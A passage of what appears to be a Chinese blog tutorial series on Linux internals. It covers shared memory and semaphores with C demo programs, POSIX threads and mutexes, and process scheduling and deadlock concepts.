当两个进程通过页表将虚拟地址映射到物理地址时，在物理地址中有一块共同的内存区，即共享内存，这块内存可以被两个进程同时看到。这样当一个进程进行写操作，另一个进程读操作就可以实现进程间通信。但是，我们要确保一个进程在写的时候不能被读，因此我们使用信号量来实现同步与互斥。 对于一个共享内存，实现采用的是引用计数的原理，当进程脱离共享存储区后，计数器减一，挂架成功时，计数器加一，只有当计数器变为零时，才能被删除。当进程终止时，它所附加的共享存储区都会自动脱离。 0x02 Linux 共享内存使用步骤 创建共享内存。也就是从内存中获得一段共享内存区域，这里用到的函数是 shmget() 映射共享内存。也就是把这段创建的共享内存映射到具体的进程空间中，这里使用的函数是 shmat() 。到这一步就可以使用这段共享内存了，也就是可以使用不带缓冲的 I&#x2F;O 读写命令对其进行操作。 撤销映射。使用完共享内存就需要撤销，用到的函数是 shmdt()。 其中用到的 Linux 系统函数介绍如下： shmget() 函数创建共享内存 1234567891011121314#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;int shmget(key_t key, int size, int shmflg);/*参数： key：共享内存的键值，多个进程可以通过它访问同一个共享内存，其中 IPC_PRIVATE 用于创建当前进程私有的共享内存 size：共享内存的大小 shmflg：同 open() 函数的权限位返回值： 成功：共享内存段标识符 失败：-1*/ shmat() 函数映射共享内存 1234567891011121314#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;char *shmat(int shmid, const void *shmaddr, int shmflg);/*参数： shmid：要映射的共享内存标识符 shmaddr：将共享内存映射到指定地址，注意这里的是 void 型指针，如果是 0 则系统将自动分配地址并将共享内存映射到调用进程的地址空间 shmflg：SHM_RDONLY（共享内存只读），0（可读写）返回值： 成功：被映射的段地址 失败：-1*/ 实验一 shmem_demo123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/sem.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define BUFFER_SIZE 256int main(int argc, char *argv[])&#123; pid_t pid; int shmid;//共享内存标识符 char *shm_addr = NULL; char flag[] = &quot;SHIYANLOU&quot;;//标志字符串 char buf[BUFFER_SIZE] = &#123;0&#125;; /* 创建共享内存 */ shmid = shmget(IPC_PRIVATE, BUFFER_SIZE, 0666); if(shmid &lt; 0) &#123; perror(&quot;shmget error&quot;); exit(1); &#125; printf(&quot;Create shared-memory: %d \\n&quot;, shmid); /* 显示共享内存情况 */ system(&quot;ipcs -m&quot;); /* 创建子进程 */ pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork error&quot;); exit(1); &#125; else if(pid == 0) &#123; /* 子进程 */ printf(&quot;[%d]Child prograss ...\\n&quot;, getpid()); //映射共享内存 shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Child: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Child : Attach shared-memory [%p]\\n&quot;, getpid(), shm_addr); /* 显示内存情况 */ system(&quot;ipcs -m&quot;); while(strncmp(shm_addr, flag, strlen(flag))) &#123; printf(&quot;[%d]Child : Wait for enable data...\\n&quot;, getpid()); sleep(5); &#125; /* 共享内存有效数据显示 */ strcpy(buf, shm_addr+strlen(flag)); printf(&quot;[%d]Child : Shared-memory: %s\\n&quot;, getpid(), buf); /* 解除共享内存映射 */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Child : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* 删除共享内存 */ if(shmctl(shmid, IPC_RMID, NULL) == -1) &#123; perror(&quot;Child : shmctl(IPC_RMID&quot;); exit(1); &#125; printf(&quot;[%d]Child : Delete shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* 子进程退出 */ exit(0); &#125; else &#123; /* 父进程 */ shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Parent: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Attach shared-memory : [%p]\\n&quot;, getpid(), shm_addr); sleep(1); printf(&quot;\\nInput some string:\\n&quot;); fgets(buf, BUFFER_SIZE, stdin); strncpy(shm_addr + strlen(flag), buf, strlen(buf)); strncpy(shm_addr, flag, strlen(flag)); /* 解除共享内存映射 */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;Parent : shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); &#125; waitpid(pid, NULL, 0); printf(&quot;\\nFinished...\\n&quot;); return 0;&#125; 在 VS Code 平台下的终端窗口使用 gcc 工具完成可执行文件编译： 12gcc shmem_demo.c -o shmem_demo./shmem_demo 执行结果如下： 实验二——shmem_sem.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199#include &lt;sys/types.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/shm.h&gt;#include &lt;sys/sem.h&gt;#include &lt;sys/wait.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#define BUFFER_SIZE 256/* 定义联合体 */union semun&#123; int val; struct semid_ds *buf; unsigned short *array;&#125;;int init_sem(int sem_id, int init_val)&#123; union semun sem_union; sem_union.val = init_val; if(semctl(sem_id, 0, SETVAL, sem_union) == -1) &#123; perror(&quot;init semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int del_sem(int sem_id)&#123; union semun sem_union; if(semctl(sem_id, 0, IPC_RMID, sem_union) == -1) &#123; // perror(&quot;Delete semaphore error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_p(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = -1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int sem_v(int sem_id)&#123; struct sembuf sem_b; sem_b.sem_num = 0; sem_b.sem_op = 1; sem_b.sem_flg = SEM_UNDO; if(semop(sem_id, &amp;sem_b, 1) == -1) &#123; perror(&quot;P error.\\n&quot;); return -1; &#125; return 0;&#125;int main(int argc, char *argv[])&#123; pid_t pid; int sem_id; int shmid; char *shm_addr = NULL; char buf[BUFFER_SIZE]; //创建信号量 sem_id = semget(ftok(&quot;.&quot;, &#x27;a&#x27;), 1, 0666|IPC_CREAT); init_sem(sem_id, 0); //创建共享内存 shmid = shmget(IPC_PRIVATE, BUFFER_SIZE, 0666); if(shmid &lt; 0) &#123; perror(&quot;shmget&quot;); exit(1); &#125; printf(&quot;Create Shared-memory : %d\\n&quot;, shmid); //显示共享内存情况 system(&quot;ipcs -m&quot;); pid = fork(); if(pid &lt; 0) &#123; perror(&quot;fork() error&quot;); exit(1); &#125; else if(pid == 0) &#123; //子进程 //映射共享内存 shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Child: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Child : Attach shared-memory [%p]\\n&quot;, getpid(), shm_addr); /* 显示内存情况 */ system(&quot;ipcs -m&quot;); printf(&quot;[%d]Child : Wait for enable data...\\n&quot;, getpid()); /* 共享内存有效数据显示 */ while(1) &#123; memset(buf, 0, BUFFER_SIZE); sem_p(sem_id); strcpy(buf, shm_addr); memset(shm_addr, 0, BUFFER_SIZE); printf(&quot;[%d]Child : Shared-memory: %s\\n&quot;, getpid(), buf); if((!strncmp(buf, &quot;q&quot;, 1)) || (!strncmp(buf, &quot;Q&quot;, 1))) &#123; printf(&quot;[%d]Child Will Quit.\\n&quot;, getpid()); break; &#125; &#125; sem_v(sem_id); del_sem(sem_id); /* 解除共享内存映射 */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Child : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* 删除共享内存 */ if(shmctl(shmid, IPC_RMID, NULL) == -1) &#123; perror(&quot;Child : shmctl(IPC_RMID&quot;); exit(1); &#125; printf(&quot;[%d]Child : Delete shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); /* 子进程退出 */ exit(0); &#125; else &#123; //父进程 shm_addr = shmat(shmid, 0, 0); if(shm_addr == (char *)-1) &#123; perror(&quot;Parent: shmat&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Attach shared-memory : [%p]\\n&quot;, getpid(), shm_addr); sleep(1); while(1) &#123; memset(buf, 0, BUFFER_SIZE); printf(&quot;\\nInput some string:\\n&quot;); fgets(buf, BUFFER_SIZE, stdin); strncpy(shm_addr, buf, strlen(buf)); sem_v(sem_id); if((!strncmp(buf, &quot;q&quot;, 1)) || (!strncmp(buf, &quot;Q&quot;, 1))) &#123; printf(&quot;[%d]Parent Will Quit.\\n&quot;, getpid()); break; &#125; &#125; /* 解除共享内存映射 */ if((shmdt(shm_addr)) &lt; 0) &#123; perror(&quot;Parent : shmdt error&quot;); exit(1); &#125; printf(&quot;[%d]Parent : Deattach shared-memory\\n&quot;, getpid()); system(&quot;ipcs -m&quot;); &#125; waitpid(pid, NULL, 0); printf(&quot;\\nFinished...\\n&quot;); return 0;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】8-Linux 线程概述","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/8-Linux 线程概述/","text":"概述：知识点 Linux 线程的基本概念 Linux 共享内存相关 API 介绍 0x01 Linux 线程的基本概念Linux 操作系统引入线程主要是为了提高系统的执行效率，减少处理机的空转时间和在进行调度切换时因保护现场信息所用的时间，便于系统管理。 线程（Threads）是进程中执行运算的最小单位，即执行处理机调度的基本代为。在 Linux 操作系统中，可以在一个进程内部进行线程切换，现场保护工作量小，并且通过共享线程的基本资源可以减轻系统开销。此外，进程中线程的切换也能提高现场切换的效率。因此，一个进程内的基本调度单位称为线程或轻型线程，这个调度单位既可以由操作系统内核控制，也可以由用户程序控制。下面就将前面所学到的进程与线程进行比较来进一步理解线程的概念： 进程是操作系统资源分配的基本单位。所有与该进程有关的资源，如外部设备、缓冲区队列等，都被记录在进程控制块 PCB 中，以表示该进程拥有这些资源。同一进程的所有线程共享该进程的所有资源。 线程是分配处理机的基本单位。它与资源分配无关，即真正在处理机上运行的是线程。 一个线程只能属于一个进程，而一个进程可以拥有多个线程，但至少有一个线程。 线程在执行过程中需要协作同步，不同进程的线程间要利用消息通信的方式实现同步（进程间通信）。 虽然上面列出了很多线程与进程的区别，但是在 Linux 操作系统中并没有进行太多区分，对进程和线程都用了相同的描述方法以及相同的调度和管理策略。 0x02 Linux 线程的状态Linux 操作系统中，线程与进程一样，也有自己的状态。线程有三种基本状态，即执行、阻塞和就绪，没有进程状态中的挂起状态。因此，线程是一个只与内存和寄存器相关的概念，内容不会因为交换而进入内存。 针对线程的三种状态，系统中存在五种基本操作来转换线程状态： 派生：线程在进程中派生出来，也可再派生线程。用户可以通过相关的系统调用派生自己的线程。在 Linux 系统中，库函数 clone() 和 creat_thread() 分别用来派生不同执行模式下的线程。新派生的线程具有相应的数据结构指针和变量，这些指针和变量作为寄存器上下文放在本线程的寄存器和堆栈中。新派生的线程被放入就绪队列。 调度：选择一个就绪线程进入执行状态。 阻塞：像进程一样，如果一个线程在执行过程中需要等待某个事件发生，则被阻塞，阻塞时，寄存器上下文、程序计数器以及堆栈指针都会得到保存。 激活：如果阻塞线程所等待的事件发生，则该线程被激活并进入就绪队列。 结束：如果一个线程执行结束，它的寄存器上下文以及堆栈内容等将被释放。 0x03 引入线程的优势多线程机制是指操作系统支持在一个进程内自行多个线程的能力。从线程的观点分析，MS-DOS 仅支持一个用户进程和一个线程；UNIX 系统支持多个用户进程，当一个进程只能有一个线程；WindowsNT 、Solaris 、 Linux 等支持多进程多线程。 虽然多种系统都支持多线程，但是实现的方式也不相同。线程有两个基本类型： 用户级线程 系统级线程（核心级线程） 用户级线程 用户级线程简称为 ULT ，由用户应用程序建立的，并由用户应用程序负责对这些线程进行调度和管理，操作系统内核并不知道有用户级线程的存在，只对进程进行管理。因此这种线程与内核无关。MS-DOS 和 UNIX 操作系统下线程就属于这种。 这种纯 ULT 方法的优点如下： 应用程序中线程的开关的时空开箱远远小于内核级线程的开销 线程的调度算法与操作系统的调度算法无关 用户级线程方法适用于任何操作系统，因为与内核无关 缺点也很明显，如下： 在一个典型的操作系统中，有许多系统请求正被阻塞着，因此，当线程执行一个系统请求时，不仅本线程阻塞，而且该线程所在进程中的所有线程都会被阻塞 在该方法的系统中，因为每个进程每次只能由一个线程在 CPU 中运行，因此，一个线程应用无法利用多处理器的优点。 内核级线程 内核级线程简称为 KLT 。内核级线程中所有线程的创建、调度和管理全部由操作系统内核负责完成。一个应用进程可按多线程方式编写程序，当它被提交给多线程操作系统运行时，内核为它创建一个进程和一个线程，线程在运行中还会创建新的线程。操作系统内核给应用程序提供相应的系统调用和应用程序接口，以使用户程序可以创建、执行、撤销线程。这种内核级线程的优点如下： 内核可以调度一个进程中的线程，使其同时在多个处理机上并行运行，从而提高系统的效率 当进程中的一个线程被阻塞时，进程中的其他线程仍然可运行 内核本身可以以线程方式实现 缺点也很明显，由于线程调度程序运行在内核态，而应用程序运行在用户态，因此同一个进程中的线程切换要经过用户态到内核态，再从内核态到用户态的两次模式装换。 用户级线程与核心机线程相结合的模式 由于用户级线程和内核级线程各有特点，因此，如果将两种方式相结合起来，则可以吸取两者的优点，结合起来的系统称为多线程的操作系统。内核支持多线程的建立、调度和管理。同时系统中又提供使用线程库，允许用户应用程序建立、调度和管理用户级线程。 Linux 的内核级线程和其他操作系统的内核实现不同。大多数操作系统单独定义描述线程的数据结构，采用单独的线程管理方式，提供专门的线程调度，这些都增加了内核和调度程序的复杂性。而在 Linux 中，将线程定义为“执行上下文”，它实际上只是进程的另外执行上下文而已，和进程采用同样的表示、管理、调度方式。这样，Linux 内核并不需要区分线程和进程，只需要一个进程&#x2F;线程管理数组，而且调度程序也只有进程的调度程序，内核的实现相对简单得多，而且节约系统用于管理方面的时间开销。 0x04 Linux线程相关 API 函数Linux 系统下的多线程遵循 POSIX 线程接口，称为 pthread ，编写 Linux 下的多线程程序需要使用头文件 pthread.h ，编译时需要使用 -pthread 链接使用库 libpthread.a，创建线程的函数接口是 pthread_create ，具体如下所示： 12345678910111213141516171819202122232425#include &lt;pthread.h&gt;int pthread_create(pthread_t *restrict thread, const pthread_attr_t *restrict attr, void *(*start_routine)(void*), void *restrict arg);/*参数： thread：负责向调用者传递子线程的线程号 attr：负责控制线程的各种属性，具体会用到属性设置结构体 pthread_attr_t，如下： typedef struct &#123; int detachstate; //线程的分离状态 int schedpolicy; //线程调度策略 structsched_param schedparam; //线程的调度参数 int inheritsched; //线程的继承性 int scope; //线程的作用域 size_t guardsize; //线程栈末尾的警戒缓冲区大小 int stackaddr_set; //线程堆栈的地址集 void* stackaddr; //线程栈的位置 size_t stacksize; //线程栈的大小 &#125;pthread_attr_t; start_routine：这个参数负责指定子线程需要允许的函数，这个参数需要一个函数指针。 arg：参数指定子线程运行函数所需的参数值。返回值： 成功返回 0，识别返回 -1*/ 线程退出函数 pthread_exit(void *retval) ，具体如下： 12345678#include &lt;pthread.h&gt;void pthread_exit(void *retval);/*参数： retval：留给主线程回收使用的退出状态值*/ 主线程回收子线程资源函数 pthread_join()，当调用 pthread_join() 时，当前线程会处于阻塞状态，直到被调用的线程结束后，当前线程才会重新开始执行。当 pthread_join() 函数返回后，被调用线程才算真正意义上的结束，内存空间才会被释放（如果被调用线程是非分离情况下），具体如下： 1234567891011#include &lt;pthread.h&gt;int pthread_join(pthread_t th, void **thread_return);/*参数： th：被连接线程的线程号 thread_return：指向一个被连接线程的返回码的接收位置返回值： 成功返回 0，失败返回一个 error number*/ 多线程程序中可能会存在数据不一致的情况，那么如何保证数据一致呢？可以考虑同一时间只有一个线程访问数据。互斥量(mutex)就是一把锁。多个线程只有一把锁一个钥匙，谁上的锁就只有谁能开锁。当一个线程要访问一个共享变量时，先用锁把变量锁住，然后再操作，操作完了之后再释放掉锁，完成。当另一个线程也要访问这个变量时，发现这个变量被锁住了，无法访问，它就会一直等待，直到锁没了，它再给这个变量上个锁，然后使用，使用完了释放锁，以此进行。这个即使有多个线程同时访问这个变量，也好象是对这个变量的操作是顺序进行的。 互斥变量使用特定的数据类型：pthread_mutex_t，使用互斥量前要先初始化，使用的函数如下： 12345678910#include &lt;pthread.h&gt;int pthread_mutex_init(pthread_mutex_t *restrict mutex, const pthread_mutexattr_t *restrict attr);int pthread_mutex_destroy(pthread_mutex_t *mutex);//对互斥量加锁解锁的函数如下：int pthread_mutex_lock(pthread_mutex_t *mutex);int pthread_mutex_trylock(pthread_mutex_t *mutex);int pthread_mutex_unlock(pthread_mutex_t *mutex); 对于线程锁的相关介绍有很多，后面有机会咱们详细介绍一下。这里先暂时了解部分用于线程同步使用。 0x05 实验一：Linux 线程创建12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;void *mythread1(void)&#123; int i; for(i = 0; i &lt; 10; i++) &#123; printf(&quot;This is the 1st pthread,created by xiaoqiang!\\n&quot;); sleep(1); &#125;&#125;void *mythread2(void)&#123; int i; for(i = 0; i &lt; 10; i++) &#123; printf(&quot;This is the 2st pthread,created by xiaoqiang!\\n&quot;); sleep(1); &#125;&#125;int main(int argc, const char *argv[])&#123; int i = 0; int ret = 0; pthread_t id1,id2; ret = pthread_create(&amp;id1, NULL, (void *)mythread1,NULL); if(ret) &#123; printf(&quot;Create pthread error!\\n&quot;); return 1; &#125; ret = pthread_create(&amp;id2, NULL, (void *)mythread2,NULL); if(ret) &#123; printf(&quot;Create pthread error!\\n&quot;); return 1; &#125; pthread_join(id1,NULL); pthread_join(id2,NULL); return 0;&#125; 0x06 实验二：Linux 线程同步问题123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596#include &lt;pthread.h&gt;#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/time.h&gt;#include &lt;string.h&gt;#define MAX 10pthread_t thread[2]; //两个线程pthread_mutex_t mut;int number=0;int i;void *thread1()&#123; printf (&quot;thread1 : I&#x27;m thread 1\\n&quot;); for (i = 0; i &lt; MAX; i++) //模拟线程执行时间 &#123; printf(&quot;thread1 : number = %d\\n&quot;,number); pthread_mutex_lock(&amp;mut); number++; pthread_mutex_unlock(&amp;mut); sleep(2); &#125; printf(&quot;thread1 :主函数在等我完成任务吗？\\n&quot;); pthread_exit(NULL);&#125;void *thread2()&#123; printf(&quot;thread2 : I&#x27;m thread 2\\n&quot;); for (i = 0; i &lt; MAX; i++) &#123; printf(&quot;thread2 : number = %d\\n&quot;,number); pthread_mutex_lock(&amp;mut); number++; pthread_mutex_unlock(&amp;mut); sleep(3); &#125; printf(&quot;thread2 :主函数在等我完成任务吗？\\n&quot;); pthread_exit(NULL);&#125;void thread_create(void) //创建两个线程&#123; int temp; memset(&amp;thread, 0, sizeof(thread)); //comment1 /*创建线程*/ if((temp = pthread_create(&amp;thread[0], NULL, thread1, NULL)) != 0) //comment2 printf(&quot;线程1创建失败!\\n&quot;); else printf(&quot;线程1被创建\\n&quot;); if((temp = pthread_create(&amp;thread[1], NULL, thread2, NULL)) != 0) //comment3 printf(&quot;线程2创建失败&quot;); else printf(&quot;线程2被创建\\n&quot;);&#125;void thread_wait(void)&#123; /*等待线程结束*/ if(thread[0] !=0) &#123; //comment4 pthread_join(thread[0],NULL); printf(&quot;线程1已经结束\\n&quot;); &#125; if(thread[1] !=0) &#123; //comment5 pthread_join(thread[1],NULL); printf(&quot;线程2已经结束\\n&quot;); &#125;&#125;int main()&#123; /*用默认属性初始化互斥锁*/ pthread_mutex_init(&amp;mut,NULL); printf(&quot;我是主函数哦，我正在创建线程，呵呵\\n&quot;); thread_create(); printf(&quot;我是主函数哦，我正在等待线程完成任务阿，呵呵\\n&quot;); thread_wait(); return 0;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://example.com/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"http://example.com/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"http://example.com/categories/A-OS/Linux/"},{"name":"Linux操作系统原理剖析","slug":"A-OS/Linux/Linux操作系统原理剖析","permalink":"http://example.com/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"【原理剖析】9-处理机调度与死锁.md","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linux操作系统原理剖析/9-处理机调度与死锁/","text":"概述： 处理机的三级调度 作业调度及进程调度的概念 调度算法的评价准则 几种常用的作业调度、进程调度算法 死锁的概念及产生原因 死锁的预防办法 死锁的检测与恢复方法 0x01 分级调度操作系统的一个非常重要的功能就是管理计算机资源，提高系统的效率。对处理机的管理是操作系统的基本功能之一。在早起的计算机系统中，对 CPU 的管理非常简单，与其他系统资源一样在整个操作系统运行过程中被单独一个作业所独占，不存在处理机分配和调度问题。随着多道程序设计技术和各种类型的操作系统的出现，各种不同的 CPU 管理方式开始使用，为用户提供不同性能的操作系统。 典型的批处理作业，从进入系统并驻留在外部存储的后备队列上开始，直到作业运行完毕，基本都需要经过这样的三级调度：作业调度、对换以及进程调度。 0x02 调度的层次 作业调度 作业调度又称为高级调度或长调度，用于选择把外部存储中处于后备队列中的哪些作业调入内存，并为它们创建进程、分配必要的资源。如何，将新创建的进程排在进程就绪队列中，准备执行。在批处理系统中，作业进入系统后，是先驻留在外部存储上的，因此需要有作业调度的过程，以便将它们分批地装入内存。在分时系统中，为了做到及时响应，用户通过键盘输入的命令或数据等，都是被直接送入内存的，因而无须再配置作业调度机制。同样地，在实时操作系统中，通常也不需要作业调度。 一个作业从提交给计算机系统到执行结束、退出系统，一般要经历提交、后备、执行和完成四种状态，如下： 提交状态：一个作业从输入设备进入外部存储设备的过程称为提交状态，处于提交状态的作业，因信息尚未全部进入系统，所以不能被调度程序选中； 后备状态（收容状态）：输入管理系统不断将作业输入到外部存储对应部分，若一个作业的全部信息都输入到了输入井中，则在它还未被调度执行前，该作业处于后备状态； 执行状态：作业调度程序从后备作业中选取若干个作业到内存投入运行，为被选中作业建立进程并分配必要的资源，这时，这些被选中的作业处于执行状态。从宏观上看，这些作业证处于在执行过程中，从微观上看，在某一时刻，由于处理机总数少于并发执行的进程数，因此，不是所有被选中作业都占有处理机，其中的大部分处于等待资源或就绪状态。哪个作业的那个进程被分配给处理机，这就是进程调度需要完成的任务； 完成状态：当作业运行完毕，当它所占用的资源尚未全部被系统收回时，该作业处于完成状态。在这种状态下，系统需要做部分善后处理工作。 对换 对换又称交换调度或中级调度，其主要任务是按照给定的原则和策略，将处于外部存储交换区中的就绪状态或等待状态的进程调入内存，或把处于内存就绪状态或内存等待状态的进程交换到外部存储交换区。交换调度主要涉及内存管理与扩充。（这部分将在后面的内存管理中详细讲到） 进程调度 进程调度又称为低级调度或微观调度，其主要任务是按照某种策略和算法，将处理机分配给一个处于就绪状态的进程。在确定了占用处理机的进程后，系统必须进行进程上下文切换以建立与占用处理机进程相适应的执行环境。进程调度可以分为以下两种方式： 非抢占方式。非抢占方式不允许进程抢占已经分配出去的处理机。采用非抢占调度方式时，可能引起进程调度的原因有正在执行的进程执行完成、因发生某事件而不能机修执行、执行中的进程因提出 I&#x2F;O 请求而暂停执行、在进程通信或同步过程中执行了某种原语操作等等。非抢占调度方式的优点是实现简单、系统开销小，适用于大部分的批处理系统环境，但是很难满足紧急任务的要求。 抢占方式。抢占调度方式允许调度程序根据某种原则暂停正在执行的进程，将处理机收回，重新分配给另一个进程。抢占的原则有优先级原则、短作业优先原则、时间片原则等。 作业调度和进程调度关系如下图所示： 0x03 调度算法在操作系统中，调度的实质是一种资源分配，因而调度算法是根据系统的资源分配策略，规定资源分配的算法。现有的各种调度算法中，有的适用于作业调度，有的则适用于进程调度，也有一些两者都适用的算法。 对于不同的系统和调度目标，应采用不同的调度算法。例如，在批处理系统中，考虑作业的平均周转时间，应采用短作业优先的调度算法；在分时系统中，为了保证系统具有合理的响应时间，应采用轮转法进行调度。下面就简单了解一下目前主流的几种调度算法。 0x04 单道批处理系统的调度算法单道批处理系统中，作业调度的主要任务是解决作业之间的自动接续问题，减少操作员的干预，提高系统资源的利用率，所采用的调度算法比较简单，有如下几种： 先来先服务调度算法：按照作业或进程到达的前后持续进行调度 短作业（进程）优先调度算法：对短作业或短进程优先调度的算法 0x05 多道批处理系统的调度算法在多道程序设计系统中，由于谋道作业的输入输出操作由通道代行控制，将 CPU 从繁多的 I&#x2F;O 操作中解脱出来，因此 CPU 可再分配给另一道作业，从而形成了多道作业并发执行的结果，减少了 CPU 对 I&#x2F;O 的等待时间。但是，由于作业不同，各作业执行时包含的 I&#x2F;O 操作时间的比例不同。基于这些原因，大多数多道程序系统的调度策略采用：先来先服务、考虑优先级、分时和优先级相结合、综合考虑资源要求等。 先来先服务调度：按照作业或进程进入就绪队列的前后顺序进行调度执行； 基于优先级调度：每一道作业或者进程都设定了一定的优先级别，优先级别可以由用户定义，也可以由系统设定或计算确定。调度时挑选优先级高者，优先级相同时，按进程进入就绪态队列或作业进入后备态队列的先后顺序； 分时和优先级相结合调度：适用于分时操作系统中或者通用操作系统； 综合考虑资源要求调度：综合考虑每一道作业或进程对资源的要求进行调度分配； 0x06 Linux 系统的调度算法前面讲了基本上所有的调度算法及其优缺点，那么在 Linux 操作系统下是什么样的情况呢。Linux 系统作业调度非常简单，或者说没有作业调度，作业一旦提交就直接进入内存，建立对应的进程，继而进入下一级的调度。交换调度主要涉及系统存储管理的内容（这部分在后面的内存管理中讲述）。 Linux 操作系统中的内核级线程和进程在表示、管理调度方面没有差别，系统也没用专门的线程调度，采用进程调度统一处理进程和内核线程。 Linux 系统的进程调度策略Linux 系统的调度程序就是内核中的 schedule() 函数，主要任务就是在就绪队列 run_queue 中选出一个进程并投入运行。schedule() 函数需要确定以下部分参数： 进程调试算法 policy 进程过程剩余时间片 counter 进程静态优先级 priority 实时进程优先级 rt_priority 用户可控制 nice 因子 上面参数被存放在进程控制块中相应的调度成员中，Linux 系统提供了三种进程调度算法，这三种算法可以由用户通过宏定义选择，具体可用调度策略如下： 调度策略标志 所代表的调度策略 #define SCHED_OTHER 普通的分时进程 #define SCHED_FIFO 先进先出的实时进程 #define SCHED_RR 基于优先级的轮转算法 #define SCHED_YIELD 不是调度策略，表示进程让出 CPU Linux 内核将进程分为实时进程和非实时进程（普通进程）两种，实时进程获得 CPU 比普通进程优先，用户可以通过系统调用 sched_setschedule() 函数改变自己的调度策略，通过系统调用 sys_setpriority() 和 sys_nice() 改变其静态优先级。 0x07 死锁问题计算机系统中有很多资源属于单独的资源，但是在很多进程中都要共享这类资源，这样，若干进程就会相互竞争有限的资源，因获取不到资源而陷入阻塞状态。 系统发送死锁现象不仅浪费大量的系统资源，甚至导致整个系统奔溃，带来严重的后果。所以，对死锁问题再理论上和技术上都必须给予高度重视，采取一些有效的措施来预防、避免死锁的发生。 0x08 死锁的概念死锁是进程死锁的简称，是由 Dijkstra 于 1965 年研究银行家算法时提出的，也是计算机操作系统乃至并发程序设计中非常重要但又最难处理的问题之一。掌握操作系统中对于死锁的处理方法，对计算机中处理并发程序的竞争问题有很大的帮助。 如下图所示，P1 进程占据资源 R1，P2 进程占据资源 R2，当 P1 进程期望得到资源 R2，而 P2 进程也期望访问资源 R1 时彼此都不能继续执行从而陷入死锁。 简单来说，死锁就是指多个进程在循环等待其他进程占有的资源，因为始终等待不到其他进程释放资源从而进入无限期等待状态；也可以说死锁是进程之间无限期互相等待的事件。 其实，在前面的部分操作实验中，我们已经解决过死锁问题。比如之前的生产者和消费者问题中，要控制两个个进程之间执行的顺序就是为了避免死锁的发生。 0x09 死锁产生的原因及必要条件从前面的介绍中可以将系统产生死锁的根本原因归结为以下几点： 个进程竞争优先的资源 进程推进顺序不当 而死锁产生的必然条件，换句话说，当系统如果可能发生死锁则一定存在如下情况或者条件： 互斥条件：对于一个排他性资源，同一时刻只能由最多一个进程占有； 占有且申请条件：进程至少占有一个资源，但是又申请新的资源，等待新资源的时候仍然没有释放已占用资源； 